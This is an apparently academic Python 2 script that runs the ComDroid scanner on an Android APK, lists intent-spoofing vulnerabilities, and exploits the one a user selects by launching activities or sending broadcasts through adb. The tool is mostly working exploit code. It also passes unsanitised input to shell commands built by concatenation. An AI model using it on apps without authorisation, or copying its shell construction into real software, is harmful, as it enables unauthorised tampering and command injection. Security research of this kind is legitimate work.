import subprocess
import os
import sys
import xml.etree.ElementTree as ET

#Types are "Activity" or "Broadcast"
class Vuln:
	def __init__(self, vs):
		self.vulnString = vs

		#parse Malicious Activity Launch vulns
		t = vs.find("Malicious Activity Launch")
		c = vs.find(",")
		if t != -1:
			self.type = "Activity"
			self.activity = vs[t+27:c]
			self.line = vs[c+2:]
			return

		#parse Malicious Broadcast Injection vulns
		t = vs.find("Malicious Broadcast Injection")
		c = vs.find(",")
		if t != -1:
			self.type = "Broadcast"
			self.activity = vs[t+31:c]
			self.line = vs[c+2:]

	def __str__(self):
		try:
			return("Type: " + self.type + "\nActivity: " + self.activity + "\nLine: " + self.line)
		except:
			return(self.vulnString)

def checkPathForADB():
	try:
		subprocess.call(["adb"], stderr=subprocess.STDOUT, stdout = subprocess.PIPE)
	except OSError:
		print "Make sure your $PATH environment variables includes the path to adb."
		sys.exit(0)	

def startActivity(package, activity):
	cmd = 'adb shell am start -n ' + package + '/' + activity
	try:
		pipe = subprocess.Popen([cmd], shell = True, stderr = subprocess.STDOUT, stdout=subprocess.PIPE)
		out, err = pipe.communicate()
		err = out.find("Error")
		if err != -1:
			print out[err:]
			return 1
	except OSError as err:
		print err
		return 1
	return 0

def sendBroadcast(broadcast):
	cmd = "adb shell am broadcast -a " + broadcast
	try:
		pipe = subprocess.Popen([cmd], shell = True, stderr = subprocess.STDOUT, stdout=subprocess.PIPE)
		out, err = pipe.communicate()
		err = out.find("Error")
		if err != -1:
			print out[err:]
			return 1
	except OSError as err:
		print err
		return 1
	return 0

def runComDroidScan():
	apk = raw_input("Enter the path to the apk you want to attack.\n").rstrip()
	
	#TODO: better output file handling
	output = raw_input("Enter the path to the directory where you want output to be stored.\n").rstrip()

	try:
		subprocess.call(["./runComDroid.sh "+apk+" "+output], shell=True,
						 stderr = subprocess.STDOUT, stdout=subprocess.PIPE)
	except OSError as err:
		print err
		sys.exit(0)

	outputFile = open(output+"/IntentResults/allWarnings", 'r')
	spoofVulns = []
	for line in outputFile:
		if "Malicious" in line:
			spoofVulns.append(Vuln(line))

	if len(spoofVulns) == 0:
		print "No intent spoofing vulnerabilities found. See "+ output+"/IntentResults/allWarnings for full scan output."
		sys.exit(0)
	else:
		print str(len(spoofVulns)) + " intent spoofing vulnerabilities found."
		exploitVulns(spoofVulns, output)

def exploitVulns(spoofVulns, output):
	for i in range(len(spoofVulns)):
		print "Vulnerability " + str(i+1) + ":"
		print spoofVulns[i]


	i = int(raw_input("Enter the number of the vulnerability you'd like to exploit (0 to quit): ")) - 1
	while (i != -1):
		if (spoofVulns[i].type == "Activity"):
			print "Attempting to exploit Activity Launch vulnerability " + str(i) + "..."
			a = spoofVulns[i].activity
			package = a[:a.rfind('.')]
			activity = a[a.rfind('.'):]
			if startActivity(package,activity) == 0:
				print "Vulnerability exploited: " + spoofVulns[i].activity + " launched."

		if (spoofVulns[i].type == "Broadcast"):
			print "Attempting to exploit Broadcast Injection vulnerability " + str(i) + "..."

			#find activity in manifest and parse out intent filters
			a = spoofVulns[i].activity
			tree = ET.parse(output+"/AndroidManifest.xml")
			root = tree.getroot()
			intents = []
			for child in root:
				if child.tag == "application":
					for receiver in child.findall("receiver"):
						if receiver.attrib["{http://schemas.android.com/apk/res/android}name"] == a:
							for intent in receiver.findall("intent-filter"):
								for action in intent.findall("action"):
									intents.append(action.attrib["{http://schemas.android.com/apk/res/android}name"])

			print str(len(intents)) + " intent(s) found."
			for i in range(len(intents)):
				print "Trying intent " + str(i+1) + "..."
				if sendBroadcast(intents[i]) == 0:
					print "Success!"

		i = int(raw_input("Enter the number of the vulnerability you'd like to exploit (0 to quit): ")) - 1


checkPathForADB()
runComDroidScan()

# /Users/admin/Documents/AndroidIntentSpoofing/Apps/HelloWorld/app/build/apk/app-debug-unaligned.apk
#TODO: add verbose mode that outputs scanning details.







